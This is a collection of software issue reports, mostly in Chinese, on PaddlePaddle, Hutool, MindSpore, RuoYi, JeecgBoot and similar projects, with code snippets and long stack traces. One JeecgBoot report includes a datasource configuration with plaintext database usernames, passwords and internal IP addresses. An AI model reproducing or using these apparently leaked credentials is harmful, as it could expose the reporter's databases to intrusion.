Do we need support Eigen with MKL,"根据 eigen 文档，我们只需要加宏来实现 和link MKL的library来enable这个功能。 但是，根据文档中所描述的加入了MKL影响的面很小，也就是基本的MKL BLAS (?GEMM, ?GEMV, ?TRSM, ?AXPY and ?DOT) and LAPACK (LU, Cholesky and QR)等，这些函数在paddle里面好像并没有使用eigen调用吧？我看用到这些的时候一般都会切到。 我实际增加了这个宏定义之后，没有任何速度提升。 @jacquesqiao @ luotao @Superjomn 你们怎么看？ PS: paddle里面的貌似只是V2的功能。   <code>: EIGEN_USE_MKL_ALL math::CBLAS USE_EIGEN_FOR_BLAS"
字典下拉框设置多选后如何回显,"除了这种方式ruoyi提供像是单选下拉框方式的方法吗   <code>: &lt;div class=""form-group""&gt; &lt;label class=""col-sm-4 control-label is-required""&gt;机构所属领域：&lt;/label&gt; &lt;div class=""col-sm-8""&gt; &lt;select name=""field"" id=""field"" class=""form-control"" th:with=""type=${@dict.getType('org_field')}"" multiple required&gt; &lt;option value=""""&gt;&lt;/option&gt; &lt;option th:each=""dict : ${type}"" th:text=""${dict.dictLabel}"" th:value=""${dict.dictValue}"" th:field=""*{field}""&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt;"
Three modules in paddle/fluid/memory/detail are highly coupled,"In , the three modules memory_block.{h,cc} meta_data.{h,cc} meta_cache.{h,cc} are highly correlated: memory_block.h depends on meta_cache.h https://github.com/PaddlePaddle/Paddle/blob/bcb46f554986a07330afc2bbf34356322d4b833d/paddle/fluid/memory/detail/memory_block.h#L36-L45 meta_cache.h depends on meta_data.h https://github.com/PaddlePaddle/Paddle/blob/bcb46f554986a07330afc2bbf34356322d4b833d/paddle/fluid/memory/detail/meta_cache.h#L40 meta_data.h depends on memory_block.h https://github.com/PaddlePaddle/Paddle/blob/bcb46f554986a07330afc2bbf34356322d4b833d/paddle/fluid/memory/detail/meta_data.h#L46-L47 Should we merge these three modules into one, or at least change the following CMakeLists.txt rules: https://github.com/PaddlePaddle/Paddle/blob/bcb46f554986a07330afc2bbf34356322d4b833d/paddle/fluid/memory/detail/CMakeLists.txt#L9-L13 into one   <code>: paddle/fluid/memory/detail/ cc_library(meta_data_cache SRCS meta_data.cc meta_cache.cc memory_block.cc)"
Hutool-db启用事务配置问题,"JDK版本： openjdk_8_201 hutool版本： 5.7.1 Hutool-db 请问，在参照以下例子使用手动提交事务时，HikariCP的配置文件中是否需要改为？   <code>: autoCommit = true false Entity entity = Entity.create(TABLE_NAME).set(""字段1"", ""值"").set(""字段2"", 2); try { session.beginTransaction(); // 增，生成SQL为 INSERT INTO `table_name` SET(`字段1`, `字段2`) VALUES(?,?) session.insert(entity); session.commit(); } catch (SQLException e) { session.quietRollback(); }"
[CT][MS]numpy.array_creations.diagonal API example test fail at ascend,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 打开官网，执行mindspore.numpy.array_creations.diagonal样例,https://www.mindspore.cn/doc/api_python/zh-CN/master/mindspore/numpy/mindspore.numpy.diagonal.html?highlight=diagonal#mindspore.numpy.diagonal 样例执行成功，且结果与官网一致   <code>: ValueError: For 'Concat' the `x_type[1]` should be == x_type[0]: Tensor[Int32], but got Tensor[Float32]"
出现AssertionError的Bug,"使用paddlepaddle进行机器翻译训练,使用的语料是中英文语料,已分词已对齐 引用训练集直接更改的.cache/paddle/wmt/wmt14.tgz里的内容,其他代码参数未修改,在开始程序后出现AssertionError错误. 报错的信息如下:   <code>: I0201 20:07:38.419838 13473 Util.cpp:166] commandline: --use_gpu=False --trainer_count=2 I0201 20:07:38.691911 13473 GradientMachine.cpp:94] Initing parameters.. I0201 20:07:41.030560 13473 GradientMachine.cpp:101] Init parameters done. Traceback (most recent call last): File ""train.py"", line 163, in &lt;module&gt; main() File ""train.py"", line 159, in main train() File ""train.py"", line 154, in train feeding=feeding) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/trainer.py"", line 162, in train for batch_id, data_batch in enumerate(reader()): File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/minibatch.py"", line 33, in batch_reader for instance in r: File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/reader/decorator.py"", line 70, in data_reader for e in reader(): File ""/home/yanmengqi/桌面/mt_with_external_memory/data_utils.py"", line 12, in new_reader for ins in reader(): File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/dataset/wmt14.py"", line 73, in reader src_dict, trg_dict = __read_to_dict__(tar_file, dict_size) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/dataset/wmt14.py"", line 60, in __read_to_dict__ assert len(names) == 1 AssertionError"
关于 swiper 组件的 display-multiple-items 属性设置为小数时在 H5 上不生效问题。,描述 展示三张图片，将 设置为 2.5，在 H5 上不生效。 期望 组件在 H5 上支持将 设置为小数点。   <code>: display-multiple-items swiper display-multiple-items
datetimepicker 默认值被覆盖,"data-date-max-date 覆盖了 data-date-default-date 导致编辑页面无法显示默认值 参考文档： https://doc.fastadmin.net/doc/181.html   <code>: &lt;input id=""c-regtime"" class=""form-control datetimepicker"" data-date-format=""YYYY-MM-DD"" name=""row[regtime]"" type=""text"" data-date-default-date=""2022-02-03"" data-date-min-date=""1970-01-01"" data-date-max-date=""{$today}"" value=""2022-02-03""&gt;"
"StrUtil.subWithLength(input, fromIndex, length)方法当fromIndex为负数length为正数，且绝对值相等时存在截取错误问题","JDK版本： 1.8 hutool版本： 5.8.4 StrUtil.subWithLength(input, fromIndex, length)方法当fromIndex为负数length为正数，且绝对值相等时存在截取错误问题   <code>: String str = ""A5E6005700000000000000000000000000000000000000090D0100000000000001003830""; System.out.println(StrUtil.subWithLength(str,-2,2)); 想截取的目标是最后两位30"
MACOS启动报错,已经安装 LibreOffice 最新版.   <code>: Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'officeToPdf': Unsatisfied dependency expressed through field 'converterUtils'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'converterUtils': Invocation of init method failed; nested exception is java.lang.IllegalStateException: invalid officeHome: it doesn't contain soffice.bin: /Applications/LibreOffice.app/Contents
online表单开发，同步数据库错误，并且不能在线测试,"版本号： 2.4.6 前端版本： vue2 一共有三个问题，问题一解决之后出现问题二，目前卡在问题二 背景描述： 项目中用到了mysql和Oracle数据库，数据库版本 Oracle 11c 数据库配置如下 jeecg_database.properties 配置如下 问题一 导入数据库提示网络错误，报了500，后端报错 问题二： 在 RequestWrapperFilter 加了一个非空判断之后，能够导入数据库，但是同步数据库又出现了问题，他给我同步到了mysql上，并且生成的代码没有加上@DS(""multi-datasource1"")   <code>: datasource: master: url: jdbc:mysql://11.40.122.237:3306/lhbank?characterEncoding=UTF-8&amp;useUnicode=true&amp;useSSL=false&amp;tinyInt1isBit=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=Asia/Shanghai username: lhbank password: LHrcb@123 driver-class-name: com.mysql.cj.jdbc.Driver # 多数据源配置 multi-datasource1: driver-class-name: oracle.jdbc.OracleDriver url: jdbc:oracle:thin:@11.40.122.235/orcl2 username: sanskj password: sskj123456 diver_name=oracle.jdbc.driver.OracleDriver url=jdbc:oracle:thin:@11.40.122.235/orcl2 username=sanskj password=sskj123456 database_name=orcl2 2022-09-01 18:08:08.666 [http-nio-8807-exec-2] ERROR o.a.c.c.C.[.[.[/prod-api].[dispatcherServlet]:175 - Servlet.service() for servlet [dispatcherServlet] in context with path [/prod-api] threw exception java.lang.NullPointerException: null at org.jeecg.modules.sanshi.api.interceptor.RequestWrapperFilter.doFilter(RequestWrapperFilter.java:30) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:88) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) 2022-09-01 18:24:13.418 [http-nio-8807-exec-7] ERROR druid.sql.Statement:149 - {conn-10005, pstmt-20027} execute error. SELECT t.code FROM onl_auth_page t WHERE t.status = 1 AND t.page = ? AND t.control = ? AND t.cgform_id = ? AND NOT EXISTS (SELECT * FROM onl_auth_relation a JOIN sys_role b ON b.id = a.role_id JOIN sys_user_role c ON c.role_id = b.id WHERE c.user_id = ? AND a.auth_id = t.id AND a.auth_mode = 'role' AND a.type IN (1, 2)) AND NOT EXISTS (SELECT * FROM onl_auth_relation e JOIN sys_depart f ON f.id = e.role_id JOIN sys_user_depart g ON g.dep_id = f.id WHERE g.user_id = ? AND e.auth_id = t.id AND e.auth_mode = 'depart' AND e.type IN (1, 2)) AND NOT EXISTS (SELECT * FROM onl_auth_relation e JOIN sys_user u ON u.id = e.role_id WHERE u.id = ? AND e.auth_id = t.id AND e.auth_mode = 'user' AND e.type IN (1, 2)) java.sql.SQLSyntaxErrorException: Table 'lhbank.onl_auth_page' doesn't exist at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:953) at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:370) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3461) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3459) at com.alibaba.druid.wall.WallFilter.preparedStatement_execute(WallFilter.java:626) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3459) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3459) at com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.execute(PreparedStatementProxyImpl.java:167) at com.alibaba.druid.pool.DruidPooledPreparedStatement.execute(DruidPooledPreparedStatement.java:497) at org.apache.ibatis.executor.statement.PreparedStatementHandler.query(PreparedStatementHandler.java:64) at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:79) at sun.reflect.GeneratedMethodAccessor231.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy441.query(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:325) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at sun.reflect.GeneratedMethodAccessor233.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy440.query(Unknown Source) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:81) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy440.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:151) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:145) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.GeneratedMethodAccessor267.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) at com.sun.proxy.$Proxy141.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:224) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForMany(MybatisMapperMethod.java:166) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:77) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy236.queryRoleNoAuthCode(Unknown Source) at org.jeecg.modules.online.auth.service.a.b.queryHideCode(OnlAuthPageServiceImpl.java:174) at org.jeecg.modules.online.auth.service.a.b$$FastClassBySpringCGLIB$$d6b5bbe0.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at org.jeecg.modules.online.auth.service.a.b$$EnhancerBySpringCGLIB$$b514c805.queryHideCode(&lt;generated&gt;) at org.jeecg.modules.online.cgform.service.impl.k.queryOnlineConfig(OnlineServiceImpl.java:64) at org.jeecg.modules.online.cgform.service.impl.k$$FastClassBySpringCGLIB$$a1d6ff72.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at org.jeecg.modules.online.cgform.service.impl.k$$EnhancerBySpringCGLIB$$d1e36f6c.queryOnlineConfig(&lt;generated&gt;) at org.jeecg.modules.online.cgform.c.a.a(OnlCgformApiController.java:148) at org.jeecg.modules.online.cgform.c.a$$FastClassBySpringCGLIB$$b70991a.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:771) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) at org.jeecg.common.aspect.AutoLogAspect.around(AutoLogAspect.java:57) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:691) at org.jeecg.modules.online.cgform.c.a$$EnhancerBySpringCGLIB$$9799b855.a(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.github.xiaoymin.knife4j.spring.filter.SecurityBasicAuthFilter.doFilter(SecurityBasicAuthFilter.java:87) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.jeecg.modules.sanshi.api.interceptor.RequestWrapperFilter.doFilter(RequestWrapperFilter.java:36) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:88) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
日期工具类获取季度末日期不准确,"JDK版本： openjdk_8_201 hutool版本： 5.3.8 已尝试最新版 ""2020-05-31 00:00:00"" 获取季度末应该是""2020-06-30 23:59:59""，结果是2020-07-01 11:59:59   <code>: Date date = DateUtil.endOfQuarter(DateUtil.parse(""2020-05-31 00:00:00"",""yyyy-MM-dd hh:mm:ss"")); Console.log(DateUtil.format(date,""yyyy-MM-dd hh:mm:ss""));"
Table增加Class参数自定义生成的table标签样式,需求描述 增加参数自定义生成的标签样式   <code>: Table Class table
 Add bijector to mindspore distribution,"RFC Add bijector to mindspore distribution kind/feature In the rfc of #I1GV6C:Add abstraction of distribution to support probabilistic programming in mindspore, it starts the work of adding abstractions of distribution to support probabilistic programming in Mindspore. The distributions are being added into Mindspore, such as pr !2605:High level abstraction of mathematical distributions . However, to add more flexibility in using distribution in Mindspore, we need to add the class to Mindspore. Basically, a will map one distribution to another distribution. Bijector as a Cell The class will inherit the class. Inside , it will support four kinds of computation: : the forward mapping; : the inverse mapping; : the log derivative of the forward mapping; : the log derivative of the backward mapping. As done in distribution, we will use the as output for now, and will update this later when more ME functionalities are added. Bijector as a mapping between instance The class can be used as mapping from one class instance to the so-called class instance. The class is a derived class of and contains a bijector and a base distribution as its member variable. A class instance is a distribution which is the result of mapping its base distribution via its bijector. For example, if the based distribution is a normal distribution and the bijector is a mapping of $Y = exp(X)$, then the transformed distribution is LogNormal distribution which is in fact $exp(Normal)$. The methods will be overloaded by the formula of computing the corresponding method with the bijector and the base distribution. For example, to generate a sample from a transformed distribution, we can firstly generate samples from the base distribution and map the samples to the result by the forward mapping of the bijector. Thus the code will be where is the base distribution and is the bijector. The can be called in the initialization step to map a distribution to a transformed distribution, so its will be overloaded when the input is a distribution class as Trail No. Task Description Related Issue(URL) 1 2   <code>: Bijector bijector Bijector Cell Bijector forward backward forward_log_jacobian backward_log_jacobian construct Distribution Bijector Distribution TransformedDistribution TransformedDistribution Distribution TransformedDistribution # inside TransformedDistribution class def _sample(self, name, shape): org_sample = self._org_dist(""sample"", shape) return self._bijector(""forward"", org_sample) self._org_dist self._bijector Bijector __call__ # inside Bijector class def __call__(self, *inputs) if(isinstance(input[0], Distribution): return TransformedDistribution(self, inputs[0]) return super(Bijector, self).__call__(*inputs)"
